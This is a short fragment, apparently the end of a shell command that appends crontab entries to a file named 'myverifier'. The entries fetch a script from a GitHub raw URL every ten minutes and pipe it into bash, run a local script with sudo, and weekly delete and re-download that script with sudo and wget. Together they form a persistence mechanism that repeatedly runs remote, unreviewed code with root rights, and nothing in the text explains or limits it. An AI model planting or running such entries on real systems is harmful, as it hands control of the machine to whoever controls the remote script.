...
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Vr00.sh | bash
*/10 * * * * sudo bash /home/blockip.sh
40 2 * * 1 sudo rm /home/blockip.sh; sudo wget -P /home/ https://raw.githubusercontent.com/junscapital/reload/master/blockip.sh
 " >> myverifier
